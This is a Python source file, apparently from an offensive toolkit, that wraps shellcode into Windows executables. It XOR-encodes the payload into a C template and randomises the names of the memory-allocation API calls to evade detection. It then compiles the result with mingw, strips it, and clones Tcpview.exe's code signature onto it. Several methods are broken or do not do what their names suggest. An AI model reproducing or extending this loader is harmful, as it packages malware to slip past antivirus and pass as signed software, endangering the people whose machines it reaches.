from lib import logger, utils, sig_thief
import hashlib, binascii, os

class Crypto:
    def __init__(self,key,file_bytes):
        self.key = 'hashed key'

    def get_key_hash(self): return hashlib.md5(utils.random_string(60).encode('utf-8')).hexdigest()

    def xor(self, data, key):
        key = str(key)
        l = len(key)
        ciphertext = ""

        for i in range(len(data)):
            current = data[i]
            current_key = key[i % len(key)]
            ciphertext += chr(current ^ ord(current_key))
        return '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'

    def aes(self):
        return self.get_key_hash()

class Scx:
    def __init__(self,lang, arch, key, file_bytes, name):
        self.lang = lang
        self.arch = arch
        self.key = key
        self.file_bytes = file_bytes
        self.name = name
        self.crypto = Crypto(self.key,self.file_bytes)

        if self.key == None:
            self.key = self.crypto.get_key_hash()

        if self.name == None:
            self.name = 'scx'

        self.outfile_c = './result/%s_%s.c' % (self.name, self.arch)
        self.outfile_cs = './result/%s._%scs' % (self.name, self.arch)
        self.outfile_net_exe = './result/%s_%s.exe' % (self.name, self.arch)
        self.outfile_exe = './result/%s_%s.exe' % (self.name, self.arch)
        self.outfile_signed_exe = './result/%s_signed_%s.exe' % (self.name, self.arch)
        self.outfile_ps1 = './result/%s_%s.ps1' % (self.name, self.arch)

        self.code = ''

        self.c_template = './templates/main.c'
        self.cs_template = './templates/main.cs'

    def strip(self):
        if os.system('strip -s %s' % (self.outfile_exe)) == 0:
            logger.msg('Stripped: ',self.outfile_exe,'green')
        else:
            logger.msg('Failed to strip: ',self.outfile_exe,'red')

    def sign(self):
        if sig_thief.signfile(self.outfile_exe, './lib/sig/Tcpview.exe_sig', self.outfile_signed_exe):
            logger.msg('Signed: ', self.outfile_signed_exe, 'green') 
        else:
            logger.msg('Failed to sign: ', self.outfile_signed_exe, 'red') 

    def compile(self):
        compiler_command = ''

        if self.lang == 'cs':
            print('Compiling with Mono')
            if self.arch == 'x86':
                compiler_command = 'mono x86'
            elif self.arch == 'x64':
                compiler_command = 'mono x64'
            else:
                return False

        elif self.lang == 'cpp':
            if self.arch == 'x86':
                compiler_command = 'i686-w64-mingw32-gcc %s -o %s' % (self.outfile_c, self.outfile_exe)
            elif self.arch == 'x64':
                compiler_command = 'x86_64-w64-mingw32-gcc %s -o %s' % (self.outfile_c, self.outfile_exe)
            else:
                return False
            logger.msg('Compiling with: ', compiler_command, 'blue')
            if os.system(compiler_command) == 0:
                if os.path.exists(self.outfile_exe):
                    logger.msg('Compiled: ',self.outfile_exe, 'green')
                    return True
                else:
                    logger.msg('Failed to compile: ',self.outfile_exe, 'red')
                    return False
            else:
                logger.msg('Failed to compile: ',self.outfile_exe, 'red')
                return False

        elif self.lang == 'ps':
            compiler_command = ''
        else:
            print('no.')

    def replace_variables(self,code, payload, key):
        code = code.replace('$SHELLCODE$',payload)
        code = code.replace('$KEY$',key)

        code = code.replace('$VirtualProtectDec$', utils.random_string())
        code = code.replace('$VirtualAllocDec$', utils.random_string())
        code = code.replace('$RtlMoveMemoryDec$', utils.random_string())

        code = code.replace('$VirtualProtectVar$', utils.random_string())
        code = code.replace('$VirtualAllocVar$', utils.random_string())
        code = code.replace('$RtlMoveMemoryVar$', utils.random_string())  

        code = code.replace('$EncryptedShellcodeVar$',utils.random_string())
        code = code.replace('$ShellcodeVar$',utils.random_string())
        return code

    def cpp(self):
        xord = self.crypto.xor(self.file_bytes, self.key)
        cpp = open(self.c_template, "rb").read().decode('utf-8')
        cpp = self.replace_variables(cpp, xord, self.key)
        self.code = cpp
        with open(self.outfile_c,'w') as f:
            f.write(self.code)

    def cs(self):
        b64 = self.crypto.aes()
        if self.randomise:
            code = 'Console.WriteLine("Randomized: $%s$");' % b64
        else:
            code = 'Console.WriteLine("Hello $TEST$");'
            code = self.replace_variables(code)
        self.code = code

    def ps(self):
        b64 = self.crypto.aes()
        if self.randomise:
            code = 'Write-Host "Randomized: $%s$"' % b64
        else:
            code = 'Write-Host "Hello $TEST$"'
            code = self.replace_variables(code)
        self.code = code